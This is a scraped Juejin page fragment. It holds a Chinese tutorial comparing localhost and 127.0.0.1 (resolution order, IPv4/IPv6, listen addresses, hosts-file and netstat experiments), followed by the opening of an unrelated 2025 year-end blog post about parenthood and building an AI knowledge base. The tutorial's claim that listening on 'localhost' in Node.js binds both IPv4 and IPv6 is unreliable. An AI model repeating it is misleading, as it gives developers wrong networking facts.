100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>localhost</code> 是<strong>主机名（域名）</strong> ，属于<strong>应用层</strong>概念；</p>
<p><code>127.0.0.1</code> 是<strong>IPv4 回环地址</strong>，属于<strong>网络层</strong>概念。</p>
<p>两者都用于访问本机服务，但 <code>localhost</code> 必须通过解析才能映射到具体 IP（默认是 <code>127.0.0.1</code> 或 IPv6 的 <code>::1</code>），而 <code>127.0.0.1</code> 是直接的网络层标识，无需解析。</p>
<hr/>
<h2 data-id="heading-0">一、本质定义与协议层次</h2>






























<table><thead><tr><th>概念</th><th><code>localhost</code></th><th><code>127.0.0.1</code></th></tr></thead><tbody><tr><td><strong>本质</strong></td><td>互联网标准规定的<strong>特殊主机名</strong>（RFC 6761 定义）</td><td>IPv4 协议规定的<strong>回环地址</strong>（RFC 5735 定义）</td></tr><tr><td><strong>协议层次</strong></td><td>应用层（DNS 协议解析范畴）</td><td>网络层（IP 协议寻址范畴）</td></tr><tr><td><strong>归属</strong></td><td>属于域名系统（DNS）</td><td>属于 IP 地址体系</td></tr><tr><td><strong>默认映射</strong></td><td>IPv4: <code>127.0.0.1</code>；IPv6: <code>::1</code></td><td>仅 IPv4 回环网段（<code>127.0.0.0/8</code>）的第一个地址</td></tr></tbody></table>
<h3 data-id="heading-1">关键补充</h3>
<ol>
<li><strong><code>127.0.0.0/8</code> 网段</strong>：不只是 <code>127.0.0.1</code>，整个 <code>127.x.x.x</code> 网段（共 16777216 个地址）都属于回环地址，访问任何一个都会指向本机。</li>
<li><strong><code>localhost</code> 的特殊性</strong>：它是一个<strong>保留主机名</strong>，不能被注册为公共域名，且操作系统会优先通过 <code>hosts</code> 文件解析，而非公共 DNS 服务器。</li>
</ol>
<hr/>
<h2 data-id="heading-2">二、解析流程的根本差异</h2>
<p>这是两者最核心的区别 ——<strong>是否需要解析</strong>，以及<strong>解析的顺序</strong>。</p>
<h3 data-id="heading-3">1. <code>localhost</code> 的解析流程（应用层 → 网络层）</h3>
<p>当你在浏览器输入 <code>http://localhost:3000</code> 时，操作系统会执行以下步骤：</p>
<ol>
<li>
<p><strong>检查本地 <code>hosts</code> 文件</strong></p>
<ul>
<li>Windows 路径：<code>C:\Windows\System32\drivers\etc\hosts</code></li>
<li>Linux/macOS 路径：<code>/etc/hosts</code></li>
<li>如果 <code>hosts</code> 文件中有如下映射：<code>127.0.0.1 localhost</code> 或 <code>::1 localhost</code>，则直接使用对应的 IP。</li>
</ul>
</li>
<li>
<p><strong>若 <code>hosts</code> 文件无映射，查询本地 DNS 缓存</strong></p>
<ul>
<li>操作系统会检查之前是否解析过 <code>localhost</code>，若有缓存则直接使用。</li>
</ul>
</li>
<li>
<p><strong>若缓存无结果，查询本地 DNS 服务器</strong></p>
<ul>
<li>但由于 <code>localhost</code> 是保留主机名，公共 DNS 服务器通常也会返回 <code>127.0.0.1</code> 或 <code>::1</code>。</li>
</ul>
</li>
<li>
<p><strong>解析完成后，转换为 IP 地址进行网络请求</strong></p>
<ul>
<li>此时才进入网络层，使用解析后的 IP 连接本机服务。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-4">2. <code>127.0.0.1</code> 的访问流程（直接进入网络层）</h3>
<p>当你输入 <code>http://127.0.0.1:3000</code> 时，<strong>跳过所有解析步骤</strong>：</p>
<ol>
<li>操作系统直接识别这是一个 IPv4 回环地址。</li>
<li>直接将网络请求发送到本机的网络接口（回环接口，<code>lo</code> 接口）。</li>
<li>目标服务监听 <code>127.0.0.1</code> 或 <code>0.0.0.0</code> 时，即可响应请求。</li>
</ol>
<hr/>
<h2 data-id="heading-5">三、功能与使用上的具体差异</h2>
<h3 data-id="heading-6">1. <strong>协议支持差异</strong></h3>
<ul>
<li>
<p><strong><code>localhost</code></strong>：支持 <strong>IPv4 和 IPv6 双协议</strong>。</p>
<ul>
<li>若你的系统开启了 IPv6，<code>localhost</code> 可能优先解析为 <code>::1</code>（IPv6 回环地址）。</li>
<li>例如：在 Node.js 中，<code>server.listen(3000, 'localhost')</code> 会同时监听 IPv4 的 <code>127.0.0.1:3000</code> 和 IPv6 的 <code>::1:3000</code>。</li>
</ul>
</li>
<li>
<p><strong><code>127.0.0.1</code></strong>：<strong>仅支持 IPv4</strong>。</p>
<ul>
<li>无论系统是否开启 IPv6，使用 <code>127.0.0.1</code> 都只会走 IPv4 协议。</li>
<li>例如：<code>server.listen(3000, '127.0.0.1')</code> 仅监听 IPv4 地址。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">2. <strong>性能差异</strong></h3>
<ul>
<li><strong><code>127.0.0.1</code> 略快</strong>：因为跳过了 DNS 解析流程（即使是本地 <code>hosts</code> 文件解析，也需要一次文件读取和匹配）。</li>
<li><strong>差异极小</strong>：在开发环境中，这种性能差异几乎可以忽略不计，除非是高频次的请求（如每秒上万次）。</li>
</ul>
<h3 data-id="heading-8">3. <strong>服务监听的差异</strong></h3>
<p>服务端程序的<strong>监听地址</strong>，会影响是否能被 <code>localhost</code> 或 <code>127.0.0.1</code> 访问：</p>



































<table><thead><tr><th>监听地址</th><th>能否被 <code>localhost</code> 访问</th><th>能否被 <code>127.0.0.1</code> 访问</th><th>能否被局域网其他设备访问</th></tr></thead><tbody><tr><td><code>localhost</code></td><td>✅</td><td>✅（IPv4 解析时）</td><td>❌</td></tr><tr><td><code>127.0.0.1</code></td><td>✅（解析为 <code>127.0.0.1</code> 时）</td><td>✅</td><td>❌</td></tr><tr><td><code>0.0.0.0</code></td><td>✅</td><td>✅</td><td>✅（通过本机局域网 IP）</td></tr><tr><td><code>::1</code>（IPv6）</td><td>✅（解析为 <code>::1</code> 时）</td><td>❌</td><td>❌</td></tr></tbody></table>
<h3 data-id="heading-9">4. <strong>自定义映射的差异</strong></h3>
<ul>
<li>
<p><strong><code>localhost</code> 可以被自定义映射</strong>：</p>
<ul>
<li>
<p>你可以修改 <code>hosts</code> 文件，将 <code>localhost</code> 映射到任意 IP，例如：</p>
<pre><code class="hljs">192.168.1.100   localhost
</code></pre>
</li>
<li>
<p>此时访问 <code>localhost</code> 会指向局域网的 <code>192.168.1.100</code>，而不是本机。</p>
</li>
</ul>
</li>
<li>
<p><strong><code>127.0.0.1</code> 无法被自定义</strong>：</p>
<ul>
<li>它是 IPv4 协议规定的回环地址，无论如何修改配置，访问 <code>127.0.0.1</code> 都只会指向本机。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-10">5. <strong>兼容性差异</strong></h3>
<ul>
<li><strong>老旧系统 / 服务</strong>：某些非常古老的程序（如早期的 DOS 程序、嵌入式设备程序）可能不识别 <code>localhost</code> 主机名，但一定能识别 <code>127.0.0.1</code>。</li>
<li><strong>IPv6 专属服务</strong>：某些服务仅监听 IPv6 的 <code>::1</code>，此时只能通过 <code>localhost</code> 访问（解析为 <code>::1</code>），而 <code>127.0.0.1</code> 无法访问。</li>
</ul>
<hr/>
<h2 data-id="heading-11">四、实际开发中的选择建议</h2>
<ol>
<li>
<p><strong>优先使用 <code>localhost</code></strong></p>
<ul>
<li>理由：兼容性更好，支持双协议，符合开发习惯，且无需关心 IPv4/IPv6 配置。</li>
<li>场景：本地开发、测试环境、前端代理配置（如 Vite、Webpack 的 <code>devServer.host: 'localhost'</code>）。</li>
</ul>
</li>
<li>
<p><strong>使用 <code>127.0.0.1</code> 的场景</strong></p>
<ul>
<li><strong>强制使用 IPv4</strong>：当服务仅监听 IPv4 地址，或系统 IPv6 配置有问题时。</li>
<li><strong>避免自定义映射</strong>：当你怀疑 <code>hosts</code> 文件被修改，<code>localhost</code> 被映射到非本机地址时。</li>
<li><strong>某些工具的特殊要求</strong>：部分 CLI 工具或服务（如某些数据库客户端）默认只识别 <code>127.0.0.1</code>。</li>
</ul>
</li>
<li>
<p><strong>特殊场景：<code>0.0.0.0</code></strong></p>
<ul>
<li>这不是回环地址，而是<strong>通配地址</strong>，表示监听本机所有网络接口（包括回环接口、局域网接口、公网接口）。</li>
<li>场景：需要让局域网其他设备访问本机服务时（如手机测试前端页面）。</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-12">五、验证两者差异的小实验</h2>
<h3 data-id="heading-13">实验 1：修改 <code>hosts</code> 文件，观察 <code>localhost</code> 映射</h3>
<ol>
<li>打开 <code>/etc/hosts</code>（Linux/macOS）或 <code>C:\Windows\System32\drivers\etc\hosts</code>（Windows）。</li>
<li>添加一行：<code>192.168.1.1 localhost</code>。</li>
<li>执行 <code>ping localhost</code>，会发现 ping 的是 <code>192.168.1.1</code>，而非 <code>127.0.0.1</code>。</li>
<li>执行 <code>ping 127.0.0.1</code>，仍然 ping 本机。</li>
<li>恢复 <code>hosts</code> 文件默认配置：<code>127.0.0.1 localhost</code> 和 <code>::1 localhost</code>。</li>
</ol>
<h3 data-id="heading-14">实验 2：查看服务监听的地址</h3>
<ol>
<li>
<p>在 Node.js 中运行以下代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);
<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">'Hello World!'</span>);
});
<span class="hljs-comment">// 监听 localhost</span>
server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-string">'localhost'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Server running on localhost:3000'</span>);
});
</code></pre>
</li>
<li>
<p>执行 <code>netstat -tulpn | grep 3000</code>（Linux/macOS）或 <code>netstat -ano | findstr 3000</code>（Windows）。</p>
</li>
<li>
<p>会发现服务同时监听 <code>127.0.0.1:3000</code> 和 <code>::1:3000</code>（IPv4 + IPv6）。</p>
</li>
<li>
<p>若将监听地址改为 <code>127.0.0.1</code>，则仅监听 <code>127.0.0.1:3000</code>。</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-15">六、总结：核心区别一览表</h2>


















































<table><thead><tr><th>对比维度</th><th><code>localhost</code></th><th><code>127.0.0.1</code></th></tr></thead><tbody><tr><td>本质</td><td>主机名（域名）</td><td>IPv4 回环地址</td></tr><tr><td>协议层次</td><td>应用层（DNS）</td><td>网络层（IP）</td></tr><tr><td>解析需求</td><td>必须解析（hosts → DNS）</td><td>无需解析</td></tr><tr><td>协议支持</td><td>IPv4 + IPv6</td><td>仅 IPv4</td></tr><tr><td>自定义映射</td><td>可通过 hosts 文件修改</td><td>不可修改，固定指向本机</td></tr><tr><td>服务监听</td><td>可同时监听 IPv4/IPv6</td><td>仅监听 IPv4</td></tr><tr><td>兼容性</td><td>现代系统支持，老旧系统可能不支持</td><td>所有支持 IPv4 的系统都支持</td></tr><tr><td>性能</td><td>略慢（解析开销）</td><td>略快（无解析开销）</td></tr></tbody></table>
<hr/>
<p><strong>我是千寻, 这期内容到这里就结束了,我们有缘再会😂😂😂 !!!</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年终总结：AI浪潮下的一年]]></title>    <link>https://juejin.cn/post/7589828902158352434</link>    <guid>https://juejin.cn/post/7589828902158352434</guid>    <pubDate>2025-12-31T11:49:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589828902158352434" data-draft-id="7589828815939108918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年终总结：AI浪潮下的一年"/> <meta itemprop="keywords" content="年终总结,人工智能,Agent"/> <meta itemprop="datePublished" content="2025-12-31T11:49:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="发光发热吧"/> <meta itemprop="url" content="https://juejin.cn/user/2647279731480477"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年终总结：AI浪潮下的一年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2647279731480477/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    发光发热吧
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T11:49:46.000Z" title="Wed Dec 31 2025 11:49:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">阔别三年，久违了</h2>
<p>Hi，大家好呀。已经很久没在掘金上写文章了，上次发文章，也是三年前的事了。这三年也不是没想过写点什么，但每次打开编辑器，敲几行字又删了...</p>
<p>可能“也许没什么好记录的吧”。哈哈～</p>
<p>今年有些不一样：这一年做的事情，可能是我这几年工作以来比较有"沉淀和进步"的一年。AI的浪潮真正席卷到了我们日常工作的每一个角落。从年初的观望，到年中的All in，再到现在真正落地了一些能力。</p>
<p>所以，25年的最后一天是值得记录下来，给这一年画个完美句号。</p>
<p>当然哈，除了技术方向上的一些唠叨，也开心的聊聊这一年的生活、还有一些零碎的感悟。</p>
<p>如果可以，听首歌，慢慢看。</p>
<h2 data-id="heading-1">生活：最大的变化，是角色的转换</h2>
<p>在消失的三年中，我成了家。有了一个可爱的女儿“柚柚”。</p>
<p>说实话，当爸爸这件事，比写任何代码都难。代码不行可以重写，bug可以debug，但小朋友的每一个哭声、每一次发烧，我都很局促…</p>
<p>女儿刚出生的那几个月，我经历了人生中最混乱的时期。白天在公司开会、写代码、处理线上问题；晚上回家换尿布、冲奶粉、哄睡觉。有一次凌晨2、3点，女儿发高烧，第一次面临这个问题手忙脚乱，夜里开车带着小孩去医院急诊。那种揪心，着急，相信每个新手爸妈都会和我一样，不知所措。</p>
<p>也分享一些没体验过的时刻：</p>
<ul>
<li>她第一次对着我笑，嘴角弯弯的，眼睛亮亮的；</li>
<li>她会用小手抓住我的手指，攥得紧紧的不肯放；</li>
<li>她会"啊啊"地跟我"对话"，虽然听不懂，但我每次都认真回应。有时候加班回家晚了，她已经睡着了。我就在床边坐一会儿，看着她的小脸，觉得一天的疲惫都消散了，很开心。</li>
</ul>
<p>成家、当爸爸，这些事情让我更加有动力给她们更好的生活。这对我来说<strong>弥足珍贵</strong>。</p>
<h2 data-id="heading-2">技术：核心三件事</h2>
<p>今年工作上最大的感受：AI从"能用"到"好用"，要走的路很长，做的事很多。</p>
<p>年初那会儿，大模型已经火了快一年，各种Agent框架、RAG方案遍地开花，再加上DeepSeek横空出世带来的冲击，感觉AI的门槛一下子被拉低了：好像谁都能花三天时间搭一个"智能助手"出来。</p>
<p>但真正想把AI落到实际业务里时，会发现：跑通一个demo和做出一个能用的产品，完全是两回事。所以这一年主要做了三件事：搭知识库、建Multi-Agent架构、做上下文工程。</p>
<h3 data-id="heading-3">首先是知识库 - 让AI"懂业务"</h3>
<p>大模型最大的问题是什么？它什么都知道一点，但对你的业务一无所知。</p>
<p>我涉及的场景是测试领域——需求文档、接口文档、历史测试用例、业务规则……这些知识散落在各个系统里，格式不一，质量参差不齐。直接丢给大模型，它根本理解不了。所以第一件事，是搭建一套企业级的知识库。</p>
<p>核心思路："先结构化，再向量化"：</p>
<ul>
<li>
<p>知识入库：把各种来源的文档统一采集，做清洗、去重、脱敏</p>
</li>
<li>
<p>语义增强：不是简单存原文，而是提取实体、关系、关键信息，形成结构化的知识单元</p>
</li>
<li>
<p>多维向量：不同粒度的内容用不同的向量策略——句子级捕捉语义细节，段落级理解上下文，文档级把握整体主题</p>
</li>
<li>
<p>混合检索：向量检索 + 关键词检索 + 规则过滤，多路召回再统一排序</p>
</li>
</ul>
<p>做完这套，AI的回答就不再是泛泛而谈的看似正确的废话了～</p>
<p>这里贴一些图吧：</p>
<p>系统架构</p>
